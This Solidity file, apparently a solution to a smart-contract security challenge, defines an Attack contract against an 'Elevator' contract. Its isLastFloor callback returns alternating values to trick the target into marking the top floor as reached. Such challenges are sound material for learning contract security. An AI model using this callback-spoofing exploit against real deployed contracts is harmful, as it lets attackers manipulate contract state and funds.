// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Attack {
    Elevator public vulnerableContract;

    bool public toggle = true;

    constructor(address _vulnerable) public {
        vulnerableContract = Elevator(_vulnerable);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function topFloor(uint _floor) public {
        vulnerableContract.goTo(_floor);
    }
}
